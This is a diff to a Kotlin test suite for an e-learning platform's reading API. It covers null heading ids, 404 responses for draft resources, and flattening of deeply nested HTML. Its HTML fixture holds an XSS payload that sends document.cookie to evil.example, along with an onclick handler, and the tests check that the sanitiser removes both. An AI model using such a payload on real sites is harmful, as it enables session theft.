@@ -3,6 +3,7 @@ package elearning.learning
 import kotlinx.coroutines.runBlocking
 import org.junit.jupiter.api.Assertions.assertEquals
 import org.junit.jupiter.api.Assertions.assertFalse
+import org.junit.jupiter.api.Assertions.assertTrue
 import org.junit.jupiter.api.Test
 import org.springframework.http.HttpStatus
 import org.springframework.http.MediaType
@@ -27,7 +28,7 @@ class ReadingApiTest : ClassroomApiTestSupport() {
 
         assertEquals("Portal del estudiante", document["title"].asString())
         val blocks = document["blocks"].values().toList()
-        assertEquals(listOf("heading", "paragraph", "admonition"), blocks.map { it["type"].asString() })
+        assertEquals(listOf("heading", "paragraph", "admonition", "heading"), blocks.map { it["type"].asString() })
         assertEquals("_entrar_y_salir_del_portal", blocks[0]["id"].asString())
         assertEquals(2, blocks[0]["level"].asInt())
         val inlines = blocks[1]["content"].values().toList()
@@ -36,6 +37,8 @@ class ReadingApiTest : ClassroomApiTestSupport() {
         assertEquals(". mal enlace", inlines[4]["text"].asString())
         assertEquals("https://example.org", inlines[3]["href"].asString())
         assertEquals("note", blocks[2]["kind"].asString())
+        // la API de registros y la del aula escriben los nulos: un encabezado sin ancla lleva "id": null
+        assertTrue(blocks[3].has("id") && blocks[3]["id"].isNull, blocks[3].toString())
         val raw = document.toString()
         listOf("script", "evil", "javascript", "class", "onclick").forEach { assertFalse(raw.contains(it, ignoreCase = true), "$it en $raw") }
         assertEquals(HttpStatus.NOT_FOUND, call(student, reading(enrollment, UUID.randomUUID().toString())).first)
@@ -86,6 +89,37 @@ class ReadingApiTest : ClassroomApiTestSupport() {
         ok(call(student, reading(enrollment, course.resource)))
     }
 
+    @Test
+    fun `reading of an unpublished resource version linked to a lesson is 404`() {
+        val course = course(html = HTML)
+        val draft = publishedResource("HTML", "borrador.html", HTML.toByteArray(), MediaType.TEXT_HTML, publish = false)
+        // datos de antes de #366: una lección de la versión publicada enlaza una versión de recurso en borrador
+        runBlocking {
+            records.asPlatform(ORG) {
+                val lesson =
+                    records.create("leccion", RecordRequest(mapOf("unidad" to course.unit, "orden" to 9, "titulo" to "Con borrador", "tipo" to "LECTURA")))
+                records.create("recurso_leccion", RecordRequest(mapOf("leccion" to lesson.id, "version_recurso" to draft, "orden" to 1)))
+            }
+        }
+        val student = newStudent()
+        val enrollment = enroll(student, course)["id"].asString()
+
+        assertEquals(HttpStatus.NOT_FOUND, call(student, reading(enrollment, draft)).first)
+        ok(call(student, reading(enrollment, course.resource)))
+    }
+
+    @Test
+    fun `a reading nested beyond the cap is flattened, not a server error`() {
+        val deep = "<ul>".repeat(5000) + "<li>fondo</li>" + "</ul>".repeat(5000)
+        val course = course(html = "<html><body>$deep</body></html>")
+        val student = newStudent()
+        val enrollment = enroll(student, course)["id"].asString()
+
+        val document = ok(call(student, reading(enrollment, course.resource)))
+
+        assertTrue(document.toString().contains("fondo"))
+    }
+
     private companion object {
         val PDF = "%PDF-1.4\n%prueba\n".toByteArray()
 
@@ -102,6 +136,7 @@ class ReadingApiTest : ClassroomApiTestSupport() {
             <script>fetch('https://evil.example/' + document.cookie)</script>
             <div class="admonitionblock note" onclick="alert(2)"><table><tr><td class="icon"><div class="title">Note</div></td>
             <td class="content">Una nota.</td></tr></table></div>
+            <h3>Sin ancla</h3>
             </div></div></div>
             </body></html>
             """.trimIndent()
